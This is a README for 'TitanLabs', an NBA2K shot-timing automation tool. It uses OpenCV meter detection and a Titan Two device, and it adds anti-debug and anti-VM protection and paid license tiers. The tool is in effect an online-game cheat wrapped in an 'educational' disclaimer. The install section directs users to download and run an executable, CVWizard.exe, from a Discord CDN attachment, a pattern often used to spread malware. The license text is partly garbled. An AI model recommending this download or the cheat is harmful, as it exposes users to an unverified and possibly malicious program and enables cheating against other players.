# 🧬 TitanLabs – NBA2K CV Engine

I WILL PROVIDE SUPPORT AND HELP FOR ANYTHING - https://discord.gg/titan-labs

This repository contains the **full TitanLabs CV-based Shot Automation Engine** used for real-time NBA2K meter detection, pixel analysis, dynamic shot timing, and Gtuner (Titan Two) output handling — combined with a fully featured **PyQt6 external GUI**, **KeyAuth authentication**, **Discord role verification**, and an advanced **anti-debug/VM/tamper security layer**.

> **© 2025 Titan Labs — Public Research Release**  
> Built by: **Mell / TitanLabs**

---

## 🚀 Overview

This project is a complete end-to-end **computer vision pipeline** for NBA2K shot detection and precise automated release timing.

It performs:

- Live pixel scanning of the shooting meter  
- Real-time detection of meter fill height  
- Timing-based release prediction  
- Auto-fire output through Titan Two Gtuner  
- Built-in GUI to customize thresholds, meter regions, colors, tempo speed, and more  

This public version is released **strictly for educational, research, and development study**.

---

## 🧩 Core Features

### 🎯 **1. Real-Time Meter Detection**
- Uses OpenCV to scan the on-screen meter region  
- Multiple color-range detection using BGR thresholding  
- Automatic measurement of meter height  
- Dynamic tracking of meter fill vs. user-defined release threshold  
- Supports custom meter colors (via GUI color picker)  

### 🕒 **2. Automated Shot Release (Square + Tempo)**
- Computes green-release timing using pixel growth  
- Supports both:
  - **Square Shot Release**
  - **Tempo Shot Release**  
- Configurable tempo pulse duration  
- Intelligent refractory logic to avoid double-firing  

### 🪟 **3. Full PyQt6 External GUI**
- Clean TitanLabs-style interface  
- Adjustable:
  - Meter region (x, y, width, height)
  - Meter color
  - Release threshold (%)
  - Tempo duration
  - Mode (Online/Offline)
  - Bounding box visibility
- Sidebar navigation with multiple modules  
- Dynamic theme + optional rainbow accent mode  

### 🔐 **4. Account Authentication & Security**
- Full KeyAuth login + registration  
- Discord ID linking  
- Discord role verification (Owner / Lifetime / Monthly)  
- Webhook logging for admin activity  
- Automatic logout / session control  

### 🛡️ **5. Anti-Debug, Anti-VM & Anti-Tamper**
This project includes an advanced security subsystem:
- VM detection (VirtualBox, QEMU, VMware)  
- Debugger detection (kernel + API level)  
- Timing-based reverse-engineering checks  
- Process list scanning (x64dbg, CE, IDA, etc.)  
- DLL scan for known reversing modules  
- SHA-256 script integrity hashing  
- mtime modification detection  
- Continuous background monitoring thread  

If tampering or debugging is detected → **the program immediately exits**.

### 🧵 **6. JSON Control Server**
- Embedded localhost JSON server  
- Allows the GUI to update:
  - Login state  
  - Meter region  
  - Release threshold  
  - Color selection  
  - Mode  
  - TitanLabs enable/disable  

### 🎮 **7. Titan Two (Gtuner) Integration**
- Frame-by-frame output via GCV API  
- Controls:
  - Button 0
  - Button 1
  - Shot pulse duration  

Compatible with Titan Two scripting pipelines.

---

## 📦 Installation

Clone the repo:

```sh
git clone https://github.com/devingwithmell/Titan-Labs---NBA2K26-CV.git
cd TitanLabs-NBA2K-CVEngine


🛠 Install Requirements

To simplify setup, download and run the TitanLabs CV Environment Wizard:

🔗 CVWizard.exe
https://cdn.discordapp.com/attachments/1436502322740990163/1436503019628925170/CVWizard.exe?ex=691fa930&is=691e57b0&hm=1d1ea5e84cfc058dc0131414df27df41ed6d15298a90569d933b33b2eb32faba&

This will automatically install:

Python environment

OpenCV

PyQt6

Numpy

Required TitanLabs dependencies

▶️ Running the Engine

Use the official TitanLabs package loader:

🔗 Helios II
https://helios.inputsense.com/api/package.php

Run your TitanLabs GCVWorker script directly through Helios or your Titan Two environment.

⚠️ Disclaimer

This project is published for research, learning, and computer vision experimentation only.

TitanLabs does not support:

Online game cheating

Abuse of automation in competitive or online play

Modifying this project to bypass anti-cheat or detection systems

Use this software responsibly and within all applicable Terms of Service.

🔐 License

TitanLabs (TL v1.0)
© 2025 TitanLabs — All Rights Reserved

This source code may be viewed, studied, and modified for personal, non-commercial, educational use only.

Bypass, strip, or modify the security system

This software is provided “as is” with no warranty of any kind SUPPORT WILL BE GIVEN TO ALL https://discord.gg/titan-labs.

🏆 Credits
Mell
Discord Community For Testing Along The Way!
